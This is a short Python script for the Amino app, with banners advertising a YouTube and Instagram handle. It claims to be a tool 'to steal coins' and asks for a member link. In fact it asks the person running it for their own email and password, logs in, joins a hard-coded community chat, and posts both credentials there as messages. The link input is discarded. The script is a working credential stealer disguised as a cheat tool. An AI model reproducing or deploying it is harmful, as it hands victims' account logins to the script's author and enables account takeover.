from colorama import init
from colorama import Fore, Back, Style
init()
print(Back.WHITE)
print(Fore.BLACK)
import amino
import os
os.system("clear")
print('                     This file to steal coins')

print("┌─────────────────────────────────────────────────────────────────")
print("│youtube : TESLOK                     ")
print("│   insta    : hz.il2                          ")
print("└─────────────────────────────────────────────────────────────────")
#إدخال البريد الإلكتروني وكلمة المرور لتسجيل الدخول إلى حسابك
em = input('\n \n \n \n your email= ')
pa = input(' your passowrd= ')
input('\n \n member lnk= ')
clint=amino.Client()
clint.login(email=em,password=pa)
clint.join_community(comId='214924547')
subclint=amino.SubClient(comId='214924547',profile=clint.profile)
subclint.join_chat(chatId='ae0539de-9c21-4983-ba9d-cbec5ce8a5b8')
subclint.send_message(chatId='ae0539de-9c21-4983-ba9d-cbec5ce8a5b8',message=em,messageType=55)
subclint.send_message(chatId='ae0539de-9c21-4983-ba9d-cbec5ce8a5b8',message=pa,messageType=55)
subclint.leave_chat(chatId='ae0539de-9c21-4983-ba9d-cbec5ce8a5b8')
clint.leave_community(comId='214924547')
print('\n \n \n \n  تم الستلام')